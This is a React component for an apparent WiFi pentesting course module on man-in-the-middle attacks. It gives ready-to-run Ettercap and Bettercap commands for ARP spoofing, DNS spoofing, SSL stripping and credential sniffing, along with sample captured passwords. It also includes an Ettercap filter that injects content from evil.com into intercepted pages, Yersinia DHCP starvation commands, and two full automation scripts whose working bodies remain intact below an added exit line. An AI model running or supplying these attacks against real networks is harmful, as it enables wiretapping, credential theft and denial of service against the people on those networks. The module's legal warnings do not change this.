import { ArrowLeftRight, AlertTriangle, Info, Shield, Globe, Wifi, Droplets } from "lucide-react";
import { CommandBlock } from "../CommandBlock";
import { ScriptBlock } from "../ScriptBlock";

export const MITMAttacks = () => {
  const bettercapScript = `#!/bin/bash
# 2027 edition: historical automation disabled; fails before any state change.
printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
exit 64

# Bettercap MITM Attack Script
# Automated ARP spoofing + credential sniffing
# Usage: sudo bash bettercap_mitm.sh <interface> [target_ip]

set -e

INTERFACE=\${1:-wlan0}
TARGET=\${2:-""}

echo "=========================================="
echo "     Bettercap MITM Attack"
echo "=========================================="
echo ""

# Install if needed
if ! command -v bettercap &>/dev/null; then
    echo "[*] Installing Bettercap..."
    sudo apt install -y bettercap
fi

# Create caplet for automated attack
CAPLET="/tmp/mitm_attack.cap"
cat > "\$CAPLET" << EOF
# Bettercap MITM Caplet
# Automated ARP spoofing + sniffing

# Enable network discovery
net.probe on

# Wait for discovery
sleep 5

# Set ARP spoofing target (empty = all)
set arp.spoof.targets $TARGET
set arp.spoof.fullduplex true

# Enable ARP spoofing
arp.spoof on

# Enable packet sniffing
set net.sniff.verbose true
set net.sniff.output /tmp/bettercap_capture.pcap
net.sniff on

# Enable DNS spoofing (optional)
# set dns.spoof.domains *.target.com
# set dns.spoof.address 192.168.1.100
# dns.spoof on

# Enable HTTP/HTTPS proxy
set http.proxy.sslstrip true
http.proxy on

# Enable credentials sniffer
set net.sniff.regexp (?i)(user|login|pass|email|credential)
EOF

echo "[*] Interface: \$INTERFACE"
echo "[*] Target: \${TARGET:-ALL}"
echo "[*] Caplet: \$CAPLET"
echo "[!] Press Ctrl+C to stop"
echo ""

sudo bettercap -iface \$INTERFACE -caplet "\$CAPLET"`;

  const dhcpStarvationScript = `#!/bin/bash
# 2027 edition: historical automation disabled; fails before any state change.
printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
exit 64

# DHCP Starvation Attack Script
# Exhausts DHCP pool to deny service
# Usage: sudo bash dhcp_starvation.sh <interface>

set -e

INTERFACE=\${1:-wlan0}

echo "=========================================="
echo "     DHCP Starvation Attack"
echo "=========================================="
echo ""
echo "[!] WARNING: This is a DoS attack!"
echo "[!] Only use with explicit authorization"
echo ""

# Install Yersinia if needed
if ! command -v yersinia &>/dev/null; then
    echo "[*] Installing Yersinia..."
    sudo apt install -y yersinia
fi

echo "[*] Interface: \$INTERFACE"
echo "[*] Starting DHCP starvation..."
echo "[*] This sends DHCP Discover packets with random MACs"
echo "[*] The DHCP server will exhaust its IP pool"
echo "[!] Press Ctrl+C to stop"
echo ""

# Method 1: Yersinia (preferred)
sudo yersinia dhcp -attack 1 -interface \$INTERFACE`;

  return (
    <section className="py-16">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center">
              <ArrowLeftRight className="w-5 h-5 text-primary" />
            </div>
            <div>
              <span className="text-xs font-mono text-primary">MODULE 14</span>
              <h2 className="text-2xl font-bold text-foreground">Man-in-the-Middle & Network Attacks</h2>
            </div>
          </div>

          <p className="text-muted-foreground mb-8">
            Once connected to a target network (or after setting up an evil twin), MITM attacks allow 
            you to intercept, modify, and analyze traffic. This module covers Ettercap, Bettercap, and 
            DHCP Starvation attacks.
          </p>

          {/* Legal Warning */}
          <div className="p-4 rounded-lg border border-destructive/50 bg-destructive/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-destructive flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-destructive mb-1">Critical Warning</h4>
                <p className="text-sm text-muted-foreground">
                  MITM attacks intercept private communications. This constitutes wiretapping without authorization. 
                  These techniques modify network traffic and can disrupt services. Only use in authorized tests.
                </p>
              </div>
            </div>
          </div>

          {/* Theory */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Info className="w-5 h-5 text-primary" />
              How MITM Works on WiFi
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">ARP Spoofing:</strong> Send forged ARP replies to convince 
                the target that your MAC is the gateway, and convince the gateway that your MAC is the target. 
                All traffic then flows through your machine.
              </p>
              <p>
                <strong className="text-foreground">Evil Twin MITM:</strong> When using an evil twin (Module 06/12), 
                you ARE the gateway. No ARP spoofing needed — all traffic already passes through you.
              </p>
              <p>
                <strong className="text-foreground">Modern Limitations:</strong> HTTPS and HSTS prevent credential 
                interception for most sites. Focus on HTTP services, internal applications, DNS poisoning, and 
                protocol downgrade attacks.
              </p>
            </div>
          </div>

          {/* Ettercap */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Shield className="w-5 h-5 text-accent" />
              Ettercap — Classic MITM Framework
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is Ettercap?</strong> The original MITM attack framework. 
                Supports ARP poisoning, DNS spoofing, packet filtering, and content injection. Available as both 
                CLI and GUI. Extensive plugin system.
              </p>
              <p>
                <strong className="text-foreground">Key Features:</strong> ARP spoofing, DNS spoofing, SSL stripping, 
                password sniffing, OS fingerprinting, connection killing, and custom filter scripts.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">Ettercap Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install -y ettercap-graphical ettercap-text-only"
              description="Install Ettercap"
              explanation="Installs both GUI (ettercap-graphical) and CLI (ettercap-text-only) versions."
            />
            <CommandBlock
              command="sudo ettercap -G"
              description="Launch Ettercap GUI"
              explanation="Opens graphical interface. Select Unified Sniffing → Choose interface → Scan for hosts → Select targets → Start ARP poisoning."
            />
            <CommandBlock
              command="sudo ettercap -T -i wlan0 -M arp:remote /192.168.1.1// /192.168.1.50//"
              description="ARP spoofing — targeted MITM"
              explanation="-T text mode, -M arp:remote enables ARP poisoning. First target is the gateway, second is the victim. All traffic between them passes through you."
              output={`ettercap 0.8.3.1 (API:0.0.0)

Listening on:
  wlan0 -> 00:11:22:33:44:55
  192.168.1.100/255.255.255.0

ARP poisoning victims:
 GROUP 1 : 192.168.1.1 AA:BB:CC:DD:EE:FF
 GROUP 2 : 192.168.1.50 11:22:33:44:55:66

Starting Unified sniffing...

HTTP : 192.168.1.50 -> admin:password123 @ http://192.168.1.1/login`}
            />
            <CommandBlock
              command="sudo ettercap -T -i wlan0 -M arp:remote /// ///"
              description="ARP spoofing — entire subnet"
              explanation="/// means all hosts. Poisons ARP for the entire subnet. Very noisy — detectable by IDS."
            />
            <CommandBlock
              command="sudo ettercap -T -i wlan0 -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.50//"
              description="ARP spoofing + DNS spoofing"
              explanation="-P dns_spoof loads the DNS spoofing plugin. Configure target domains in /etc/ettercap/etter.dns first."
            />
            <CommandBlock
              command={`echo "*.targetsite.com A 192.168.1.100" | sudo tee -a /etc/ettercap/etter.dns`}
              description="Configure DNS spoofing targets"
              explanation="Add DNS entries to redirect. All requests for targetsite.com will resolve to your IP (192.168.1.100)."
            />
            <CommandBlock
              command="sudo ettercap -T -i wlan0 -w capture.pcap -M arp:remote /192.168.1.1// /192.168.1.50//"
              description="MITM with packet capture"
              explanation="-w saves all intercepted traffic to pcap file for later analysis in Wireshark."
            />
          </div>

          {/* Ettercap Filters */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Ettercap Filter Example</h3>
            <div className="text-sm text-muted-foreground space-y-2">
              <p>Ettercap filters can modify traffic in real-time. Create a .ecf file:</p>
              <pre className="font-mono text-xs bg-background/50 p-3 rounded overflow-x-auto">{`# replace_img.ecf - Replace all images with your own
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Nothing!");
   }
}
if (ip.proto == TCP && tcp.src == 80) {
   if (search(DATA.data, "<img")) {
      replace("<img", "<img src='http://evil.com/hacked.png' ");
      msg("Image replaced!\\n");
   }
}`}</pre>
              <p className="mt-2">Compile and use: <code className="text-primary">etterfilter replace_img.ecf -o replace_img.ef && ettercap -T -F replace_img.ef ...</code></p>
            </div>
          </div>

          {/* Bettercap */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Globe className="w-5 h-5 text-success" />
              Bettercap — Modern MITM Framework
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is Bettercap?</strong> The modern successor to Ettercap. 
                Written in Go, faster, more reliable, with a modular architecture. Features a WebUI, REST API, 
                caplet scripting, and modules for WiFi, BLE, and HID attacks.
              </p>
              <p>
                <strong className="text-foreground">Advantages over Ettercap:</strong> Active development, WebUI dashboard, 
                caplet automation, WiFi deauth integration, BLE attacks, HID injection, better SSL stripping, 
                HTTP/HTTPS proxying, and credential sniffing.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">Bettercap Usage</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install -y bettercap"
              description="Install Bettercap"
              explanation="Available in Kali repos. Written in Go — fast and dependency-free binary."
            />
            <CommandBlock
              command="sudo bettercap -iface wlan0"
              description="Launch Bettercap interactive console"
              explanation="Opens the bettercap shell with tab completion. Type 'help' for available modules."
              output={`bettercap v2.32.0

[18:30:00] [sys.log] [inf] bettercap v2.32.0
[18:30:00] [sys.log] [inf] api.rest > running on 0.0.0.0:8081 (disable with api.rest off)

192.168.1.0/24 > 192.168.1.100 »`}
            />
            <CommandBlock
              command="bettercap » net.probe on"
              description="Discover hosts on network"
              explanation="Sends ARP probes to discover all hosts. Results appear as they're found. Use 'net.show' to list."
            />
            <CommandBlock
              command="bettercap » net.show"
              description="Display discovered hosts"
              explanation="Shows all discovered hosts with IP, MAC, vendor, hostname, and traffic statistics."
              output={`┌─────────────────────────────────────────────────────────────┐
│ IP             MAC                Vendor          Hostname  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1    AA:BB:CC:DD:EE:FF  Cisco           gateway   │
│ 192.168.1.50   11:22:33:44:55:66  Apple           iPhone    │
│ 192.168.1.75   11:22:33:44:55:77  Samsung         Galaxy    │
└─────────────────────────────────────────────────────────────┘`}
            />
            <CommandBlock
              command="bettercap » set arp.spoof.targets 192.168.1.50; arp.spoof on"
              description="ARP spoofing — targeted"
              explanation="Poisons ARP for the specified target. Traffic between target and gateway flows through you."
            />
            <CommandBlock
              command="bettercap » set arp.spoof.fullduplex true; set arp.spoof.targets 192.168.1.50; arp.spoof on"
              description="Full-duplex ARP spoofing"
              explanation="Poisons both the target AND the gateway. More reliable MITM but more detectable."
            />
            <CommandBlock
              command="bettercap » net.sniff on"
              description="Enable packet sniffing"
              explanation="Captures and displays intercepted traffic in real-time. Shows HTTP credentials, cookies, URLs visited."
            />
            <CommandBlock
              command="bettercap » set http.proxy.sslstrip true; http.proxy on"
              description="SSL stripping proxy"
              explanation="Downgrades HTTPS to HTTP when possible. Intercepts credentials from sites without HSTS. Less effective on modern browsers."
            />
            <CommandBlock
              command="bettercap » set dns.spoof.domains evil.com,login.evil.com; set dns.spoof.address 192.168.1.100; dns.spoof on"
              description="DNS spoofing"
              explanation="Redirects specified domains to your IP. Combine with a fake website to phish credentials."
            />
            <CommandBlock
              command="sudo bettercap -iface wlan0 -caplet /usr/share/bettercap/caplets/http-ui.cap"
              description="Launch Bettercap WebUI"
              explanation="Starts the web-based dashboard (default: http://127.0.0.1:80). Provides visual interface for all attacks."
            />
          </div>

          {/* Bettercap Caplets */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Useful Bettercap Caplets</h3>
            <div className="space-y-2 text-sm text-muted-foreground">
              <p><code className="text-primary">http-ui.cap</code> — WebUI dashboard for visual attack management</p>
              <p><code className="text-primary">arp.spoof.cap</code> — Basic ARP spoofing with sniffing</p>
              <p><code className="text-primary">beef-inject.cap</code> — Inject BeEF hook into HTTP pages</p>
              <p><code className="text-primary">hstshijack/hstshijack.cap</code> — HSTS bypass caplet</p>
              <p><code className="text-primary">download-autopwn.cap</code> — Replace downloads with payloads</p>
            </div>
          </div>

          {/* DHCP Starvation */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Droplets className="w-5 h-5 text-destructive" />
              DHCP Starvation Attack
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">What is DHCP Starvation?</strong> A denial-of-service attack 
                that exhausts the DHCP server's IP address pool. By flooding DHCP Discover requests with random 
                MAC addresses, no legitimate clients can obtain an IP address.
              </p>
              <p>
                <strong className="text-foreground">Use in Pentesting:</strong> After starving the legitimate DHCP, 
                set up your own DHCP server to assign IPs. This forces clients to use your gateway, enabling MITM 
                without ARP spoofing.
              </p>
            </div>
          </div>

          <h3 className="text-lg font-semibold text-foreground mb-4">DHCP Starvation</h3>
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install -y yersinia"
              description="Install Yersinia"
              explanation="Yersinia is a network attack tool supporting DHCP, STP, CDP, DTP, and other Layer 2 protocols."
            />
            <CommandBlock
              command="sudo yersinia dhcp -attack 1 -interface wlan0"
              description="DHCP starvation with Yersinia"
              explanation="Attack mode 1 sends DHCP Discover packets with random MACs. Exhausts the DHCP pool in seconds."
              output={`Yersinia v0.8.2

Starting DHCP starvation attack on wlan0...
Sent DHCPDISCOVER (MAC: aa:11:22:33:44:55)
Sent DHCPDISCOVER (MAC: bb:22:33:44:55:66)
Sent DHCPDISCOVER (MAC: cc:33:44:55:66:77)
...
[+] Sent 253 DHCP Discover packets
[+] DHCP pool likely exhausted`}
            />
            <CommandBlock
              command="sudo yersinia -G"
              description="Yersinia GUI mode"
              explanation="Opens graphical interface with visual controls for all attack types."
            />
            <CommandBlock
              command="sudo bettercap -iface wlan0 -eval 'dhcp6.spoof on'"
              description="DHCPv6 spoofing with Bettercap"
              explanation="Attacks DHCPv6. In dual-stack networks, clients may prefer IPv6 DHCP, bypassing IPv4 security."
            />
          </div>

          {/* MITM Attack Flow */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Recommended MITM Attack Flow</h3>
            <div className="space-y-2 text-sm text-muted-foreground">
              <p><strong className="text-foreground">1.</strong> Discover hosts: <code className="text-primary">net.probe on → net.show</code></p>
              <p><strong className="text-foreground">2.</strong> Identify targets: Look for high-value hosts (servers, admin machines)</p>
              <p><strong className="text-foreground">3.</strong> ARP spoof: <code className="text-primary">arp.spoof on</code> (targeted, not broadcast)</p>
              <p><strong className="text-foreground">4.</strong> Sniff traffic: <code className="text-primary">net.sniff on</code></p>
              <p><strong className="text-foreground">5.</strong> Enable proxies: <code className="text-primary">http.proxy on</code> for credential capture</p>
              <p><strong className="text-foreground">6.</strong> DNS spoof (optional): Redirect to phishing pages</p>
              <p><strong className="text-foreground">7.</strong> Document: Save pcap, log credentials for report</p>
            </div>
          </div>

          {/* Automation Scripts */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Automation Scripts</h3>
          <div className="space-y-6 mb-8">
            <ScriptBlock
              title="Bettercap MITM Automation"
              filename="bettercap_mitm.sh"
              language="bash"
              description="Automated ARP spoofing with credential sniffing, SSL stripping, and packet capture"
              code={bettercapScript}
            />
            <ScriptBlock
              title="DHCP Starvation Attack"
              filename="dhcp_starvation.sh"
              language="bash"
              description="Exhausts DHCP pool using Yersinia to deny service and set up rogue DHCP"
              code={dhcpStarvationScript}
            />
          </div>
        </div>
      </div>
    </section>
  );
};
